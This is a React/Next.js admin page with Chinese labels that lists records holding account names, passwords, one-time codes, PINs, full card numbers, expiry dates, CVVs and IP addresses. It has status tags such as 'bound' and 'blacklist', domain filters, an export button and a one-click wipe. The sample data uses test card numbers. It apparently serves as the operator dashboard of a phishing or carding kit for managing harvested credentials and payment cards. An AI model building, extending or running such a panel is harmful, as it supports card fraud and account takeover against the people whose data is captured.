"use client"

import { useState, useMemo } from "react"
import Layout from "@/components/layout"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Checkbox } from "@/components/ui/checkbox"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Badge } from "@/components/ui/badge"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import {
  Search,
  SlidersHorizontal,
  Upload,
  Trash2,
  ChevronLeft,
  ChevronRight,
  Settings,
  MoreVertical,
  CreditCard,
  FilterX,
  ListChecks,
} from "lucide-react"

interface DataEntry {
  id: string
  userIdPrefix: string
  userIdSuffix: string
  userEmail: string
  account?: string
  password?: string
  otp?: string
  pin?: string
  name: string
  avatarFallback: string
  cardHolderName: string
  cardNumber: string
  cardExpiry: string
  cardCvv: string
  cardType: string // e.g., 'D' for Debit, 'C' for Credit
  remarks?: string
  status: "待处理" | "已绑定" | "已完成" | "垃圾桶" | "黑名单"
  ip: string
  createdAt: string
}

const mockData: DataEntry[] = [
  {
    id: "1",
    userIdPrefix: "CA",
    userIdSuffix: "(A-4383)",
    userEmail: "family@buyzone.com",
    account: "user_account_1",
    password: "password123",
    otp: "123456",
    pin: "1234",
    name: "lin bei",
    avatarFallback: "LB",
    cardHolderName: "Lin Bei",
    cardNumber: "4111 1111 1111 1111",
    cardExpiry: "01/27",
    cardCvv: "666",
    cardType: "D",
    remarks: "首次入金",
    status: "待处理",
    ip: "38.109.112.6",
    createdAt: "2025-06-06 01:11:16",
  },
  {
    id: "2",
    userIdPrefix: "US",
    userIdSuffix: "(B-1234)",
    userEmail: "john.doe@example.com",
    account: "john_doe",
    password: "securepassword",
    otp: "654321",
    pin: "4321",
    name: "John Doe",
    avatarFallback: "JD",
    cardHolderName: "John Doe",
    cardNumber: "5555 2222 2222 2222",
    cardExpiry: "12/26",
    cardCvv: "123",
    cardType: "C",
    remarks: "大额交易",
    status: "已绑定",
    ip: "192.168.1.100",
    createdAt: "2025-06-05 10:30:00",
  },
  {
    id: "3",
    userIdPrefix: "GB",
    userIdSuffix: "(C-5678)",
    userEmail: "jane.smith@example.co.uk",
    account: "jane_smith",
    password: "anotherpassword",
    otp: "112233",
    pin: "1122",
    name: "Jane Smith",
    avatarFallback: "JS",
    cardHolderName: "Jane Smith",
    cardNumber: "4999 3333 3333 3333",
    cardExpiry: "06/28",
    cardCvv: "789",
    cardType: "D",
    status: "已完成",
    ip: "203.0.113.25",
    createdAt: "2025-06-04 15:00:00",
  },
  // Add more mock data as needed
]

export default function DataCenterPage() {
  const [userStatusFilter, setUserStatusFilter] = useState("all")
  const [cardFilter, setCardFilter] = useState("all")
  const [domainFilter, setDomainFilter] = useState("")
  const [dateRangeFilter, setDateRangeFilter] = useState("")
  const [cardNumberFilter, setCardNumberFilter] = useState("")
  const [searchId, setSearchId] = useState("")

  const [selectedEntryIds, setSelectedEntryIds] = useState<Set<string>>(new Set())
  const [itemsPerPage, setItemsPerPage] = useState(10)
  const [currentPage, setCurrentPage] = useState(1)

  const filteredData = useMemo(() => {
    return mockData.filter((entry) => {
      if (userStatusFilter !== "all" && entry.status !== userStatusFilter) return false
      // Add other filter conditions here based on cardFilter, domainFilter, etc.
      if (domainFilter && !entry.userEmail.includes(domainFilter) && !entry.userIdSuffix.includes(domainFilter))
        return false // Simple domain check on email or suffix
      if (cardNumberFilter && !entry.cardNumber.includes(cardNumberFilter)) return false
      if (
        searchId &&
        entry.id !== searchId &&
        !entry.userIdSuffix.includes(searchId) &&
        !entry.userEmail.includes(searchId)
      )
        return false
      // Date range filter would require a date parsing library or more complex logic
      return true
    })
  }, [userStatusFilter, cardFilter, domainFilter, dateRangeFilter, cardNumberFilter, searchId])

  const totalPages = Math.ceil(filteredData.length / itemsPerPage)
  const paginatedData = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredData.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredData, currentPage, itemsPerPage])

  const handleSelectAll = (checked: boolean) => {
    if (checked) {
      setSelectedEntryIds(new Set(paginatedData.map((entry) => entry.id)))
    } else {
      setSelectedEntryIds(new Set())
    }
  }

  const handleRowSelection = (id: string, checked: boolean) => {
    setSelectedEntryIds((prev) => {
      const newSet = new Set(prev)
      if (checked) {
        newSet.add(id)
      } else {
        newSet.delete(id)
      }
      return newSet
    })
  }

  const getStatusBadgeVariant = (status: DataEntry["status"]) => {
    switch (status) {
      case "待处理":
        return "bg-amber-500/10 text-amber-400 border-amber-500/30"
      case "已绑定":
        return "bg-blue-500/10 text-blue-400 border-blue-500/30"
      case "已完成":
        return "bg-green-500/10 text-green-400 border-green-500/30"
      case "垃圾桶":
      case "黑名单":
        return "bg-red-500/10 text-red-400 border-red-500/30"
      default:
        return "bg-slate-500/10 text-slate-400 border-slate-500/30"
    }
  }

  const resetFilters = () => {
    setUserStatusFilter("all")
    setCardFilter("all")
    setDomainFilter("")
    setDateRangeFilter("")
    setCardNumberFilter("")
    setSearchId("")
  }

  return (
    <Layout>
      <div className="space-y-6">
        <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
          <CardHeader>
            <CardTitle className="text-slate-100 text-lg flex items-center">
              <SlidersHorizontal className="h-5 w-5 mr-2 text-purple-400" />
              搜索过滤器
            </CardTitle>
          </CardHeader>
          <CardContent className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
            <Select value={userStatusFilter} onValueChange={setUserStatusFilter}>
              <SelectTrigger className="bg-slate-800 border-slate-600 text-slate-100" aria-label="用户状态">
                <SelectValue placeholder="用户状态" />
              </SelectTrigger>
              <SelectContent className="bg-slate-800 border-slate-700 text-slate-100">
                <SelectItem value="all">全部用户状态</SelectItem>
                <SelectItem value="待处理">待处理</SelectItem>
                <SelectItem value="已绑定">已绑定</SelectItem>
                <SelectItem value="已完成">已完成</SelectItem>
                <SelectItem value="垃圾桶">垃圾桶</SelectItem>
                <SelectItem value="黑名单">黑名单</SelectItem>
              </SelectContent>
            </Select>
            <Select value={cardFilter} onValueChange={setCardFilter}>
              <SelectTrigger className="bg-slate-800 border-slate-600 text-slate-100" aria-label="填卡筛选">
                <SelectValue placeholder="填卡筛选" />
              </SelectTrigger>
              <SelectContent className="bg-slate-800 border-slate-700 text-slate-100">
                <SelectItem value="all">全部填卡筛选</SelectItem>
                {/* Add more card filter options here */}
              </SelectContent>
            </Select>
            <Input
              type="text"
              placeholder="域名"
              value={domainFilter}
              onChange={(e) => setDomainFilter(e.target.value)}
              className="bg-slate-800 border-slate-600 text-slate-100"
            />
            <Input
              type="text"
              placeholder="日期范围"
              value={dateRangeFilter}
              onChange={(e) => setDateRangeFilter(e.target.value)}
              className="bg-slate-800 border-slate-600 text-slate-100"
            />
            <Input
              type="text"
              placeholder="卡号"
              value={cardNumberFilter}
              onChange={(e) => setCardNumberFilter(e.target.value)}
              className="bg-slate-800 border-slate-600 text-slate-100"
            />
            <div className="lg:col-start-5 flex gap-2">
              <Button onClick={() => setCurrentPage(1)} className="bg-purple-600 hover:bg-purple-700 w-full sm:w-auto">
                <Search className="h-4 w-4 mr-2" />
                查询
              </Button>
              <Button
                onClick={resetFilters}
                variant="outline"
                className="bg-slate-700 border-slate-600 hover:bg-slate-600 w-full sm:w-auto"
              >
                <FilterX className="h-4 w-4 mr-2" />
                重置
              </Button>
            </div>
          </CardContent>
        </Card>

        <Card className="bg-slate-900/50 border-slate-700/50 backdrop-blur-sm">
          <CardHeader className="flex flex-col sm:flex-row items-center justify-between gap-4 pb-4">
            <div className="flex items-center gap-4">
              <Select
                value={String(itemsPerPage)}
                onValueChange={(val) => {
                  setItemsPerPage(Number(val))
                  setCurrentPage(1)
                }}
              >
                <SelectTrigger className="w-[80px] bg-slate-800 border-slate-600 text-slate-100">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent className="bg-slate-800 border-slate-700 text-slate-100">
                  <SelectItem value="10">10</SelectItem>
                  <SelectItem value="25">25</SelectItem>
                  <SelectItem value="50">50</SelectItem>
                  <SelectItem value="100">100</SelectItem>
                </SelectContent>
              </Select>
              <Input
                type="text"
                placeholder="Search ID"
                value={searchId}
                onChange={(e) => setSearchId(e.target.value)}
                className="bg-slate-800 border-slate-600 text-slate-100 h-9 w-40"
              />
            </div>
            <div className="flex items-center gap-2">
              <Button variant="outline" className="bg-slate-700 border-slate-600 hover:bg-slate-600 text-sm">
                <ListChecks className="h-4 w-4 mr-2" />
                批量操作
              </Button>
              <Button variant="outline" className="bg-slate-700 border-slate-600 hover:bg-slate-600 text-sm">
                <Upload className="h-4 w-4 mr-2" />
                导出
              </Button>
              <Button variant="destructive" size="sm" className="bg-red-700/80 hover:bg-red-700 text-sm">
                <Trash2 className="h-4 w-4 mr-2" />
                一键清空
              </Button>
            </div>
          </CardHeader>
          <CardContent className="p-0">
            <div className="overflow-x-auto">
              <Table>
                <TableHeader className="bg-slate-800/50">
                  <TableRow className="border-slate-700/50">
                    <TableHead className="p-3 w-12 text-slate-400">
                      <Checkbox
                        checked={selectedEntryIds.size > 0 && selectedEntryIds.size === paginatedData.length}
                        onCheckedChange={(checked) => handleSelectAll(!!checked)}
                        className="border-slate-600 data-[state=checked]:bg-purple-500 data-[state=checked]:border-purple-500"
                      />
                    </TableHead>
                    <TableHead className="p-3 text-slate-400">用户ID</TableHead>
                    <TableHead className="p-3 text-slate-400">账号</TableHead>
                    <TableHead className="p-3 text-slate-400">密码</TableHead>
                    <TableHead className="p-3 text-slate-400">OTP</TableHead>
                    <TableHead className="p-3 text-slate-400">PIN</TableHead>
                    <TableHead className="p-3 text-slate-400">姓名</TableHead>
                    <TableHead className="p-3 text-slate-400 min-w-[300px]">卡信息</TableHead>
                    <TableHead className="p-3 text-slate-400">备注</TableHead>
                    <TableHead className="p-3 text-slate-400">状态</TableHead>
                    <TableHead className="p-3 text-slate-400">IP</TableHead>
                    <TableHead className="p-3 text-slate-400">创建时间</TableHead>
                    <TableHead className="p-3 text-slate-400 text-center">操作</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {paginatedData.map((entry) => (
                    <TableRow key={entry.id} className="border-slate-700/50 hover:bg-slate-800/30">
                      <TableCell className="p-3">
                        <Checkbox
                          checked={selectedEntryIds.has(entry.id)}
                          onCheckedChange={(checked) => handleRowSelection(entry.id, !!checked)}
                          className="border-slate-600 data-[state=checked]:bg-purple-500 data-[state=checked]:border-purple-500"
                        />
                      </TableCell>
                      <TableCell className="p-3 text-sm text-slate-300">
                        <div className="flex items-center">
                          <Badge
                            variant="outline"
                            className="mr-2 bg-purple-500/10 text-purple-400 border-purple-500/50 text-xs px-1.5 py-0.5"
                          >
                            {entry.userIdPrefix}
                          </Badge>
                          <span>{entry.userIdSuffix}</span>
                        </div>
                        <div className="text-xs text-slate-500">{entry.userEmail}</div>
                      </TableCell>
                      <TableCell className="p-3 text-sm text-slate-300">{entry.account || "N/A"}</TableCell>
                      <TableCell className="p-3 text-sm text-slate-300">
                        {entry.password ? "••••••••" : "N/A"}
                      </TableCell>
                      <TableCell className="p-3 text-sm text-slate-300">{entry.otp || "N/A"}</TableCell>
                      <TableCell className="p-3 text-sm text-slate-300">{entry.pin || "N/A"}</TableCell>
                      <TableCell className="p-3 text-sm text-slate-300">
                        <div className="flex items-center">
                          <Avatar className="h-7 w-7 mr-2">
                            <AvatarImage
                              src={`/placeholder.svg?height=28&width=28&text=${entry.avatarFallback}`}
                              alt={entry.name}
                            />
                            <AvatarFallback className="bg-slate-700 text-xs">{entry.avatarFallback}</AvatarFallback>
                          </Avatar>
                          <div>
                            <div>{entry.name}</div>
                            <div className="text-xs text-slate-500">{entry.userEmail.split("@")[1]}</div>{" "}
                            {/* Show domain */}
                          </div>
                        </div>
                      </TableCell>
                      <TableCell className="p-3 text-sm text-slate-300">
                        <div className="flex items-center space-x-1">
                          <Badge
                            variant="outline"
                            className="bg-slate-700 border-slate-600 text-slate-300 text-xs px-1.5 py-0.5"
                          >
                            <CreditCard className="h-3 w-3 mr-1 text-purple-400" />
                            {entry.cardType}
                          </Badge>
                          <span>{entry.cardHolderName}</span>
                          <span>{entry.cardNumber}</span>
                          <span>{entry.cardExpiry}</span>
                          <span>{entry.cardCvv}</span>
                        </div>
                      </TableCell>
                      <TableCell className="p-3 text-sm text-slate-400 max-w-[150px] truncate" title={entry.remarks}>
                        {entry.remarks || "N/A"}
                      </TableCell>
                      <TableCell className="p-3">
                        <Badge variant="outline" className={getStatusBadgeVariant(entry.status)}>
                          {entry.status}
                        </Badge>
                      </TableCell>
                      <TableCell className="p-3 text-sm text-slate-300">{entry.ip}</TableCell>
                      <TableCell className="p-3 text-sm text-slate-400">{entry.createdAt}</TableCell>
                      <TableCell className="p-3 text-center">
                        <DropdownMenu>
                          <DropdownMenuTrigger asChild>
                            <Button variant="ghost" size="icon" className="text-slate-400 hover:text-slate-100 h-8 w-8">
                              <MoreVertical className="h-4 w-4" />
                            </Button>
                          </DropdownMenuTrigger>
                          <DropdownMenuContent align="end" className="bg-slate-800 border-slate-700 text-slate-100">
                            <DropdownMenuItem className="hover:bg-slate-700">查看详情</DropdownMenuItem>
                            <DropdownMenuItem className="hover:bg-slate-700">编辑</DropdownMenuItem>
                            <DropdownMenuItem className="hover:bg-slate-700 text-red-400 hover:text-red-300">
                              删除
                            </DropdownMenuItem>
                          </DropdownMenuContent>
                        </DropdownMenu>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
            {paginatedData.length === 0 && <p className="p-6 text-center text-slate-500">没有找到匹配的记录。</p>}
          </CardContent>
        </Card>

        {/* Pagination */}
        <div className="flex items-center justify-between pt-4">
          <p className="text-sm text-slate-400">
            Showing {paginatedData.length > 0 ? (currentPage - 1) * itemsPerPage + 1 : 0} to{" "}
            {Math.min(currentPage * itemsPerPage, filteredData.length)} of {filteredData.length} entries
          </p>
          <div className="flex items-center gap-1">
            <Button
              variant="outline"
              size="sm"
              onClick={() => setCurrentPage((prev) => Math.max(1, prev - 1))}
              disabled={currentPage === 1}
              className="bg-slate-800 border-slate-600 hover:bg-slate-700"
            >
              <ChevronLeft className="h-4 w-4" />
            </Button>
            {Array.from({ length: Math.min(totalPages, 5) }, (_, i) => {
              let pageNum = i + 1
              if (totalPages > 5 && currentPage > 3) {
                if (currentPage + 2 <= totalPages) pageNum = currentPage - 2 + i
                else pageNum = totalPages - 4 + i
              }
              return (
                <Button
                  key={pageNum}
                  variant={currentPage === pageNum ? "default" : "outline"}
                  size="sm"
                  onClick={() => setCurrentPage(pageNum)}
                  className={
                    currentPage === pageNum
                      ? "bg-purple-600 hover:bg-purple-700 w-8 h-8"
                      : "bg-slate-800 border-slate-600 hover:bg-slate-700 w-8 h-8"
                  }
                >
                  {pageNum}
                </Button>
              )
            })}
            <Button
              variant="outline"
              size="sm"
              onClick={() => setCurrentPage((prev) => Math.min(totalPages, prev + 1))}
              disabled={currentPage === totalPages}
              className="bg-slate-800 border-slate-600 hover:bg-slate-700"
            >
              <ChevronRight className="h-4 w-4" />
            </Button>
            <Button variant="ghost" size="icon" className="text-slate-400 hover:text-slate-100 h-8 w-8">
              <Settings className="h-4 w-4" />
              <span className="sr-only">表格设置</span>
            </Button>
          </div>
        </div>
      </div>
    </Layout>
  )
}
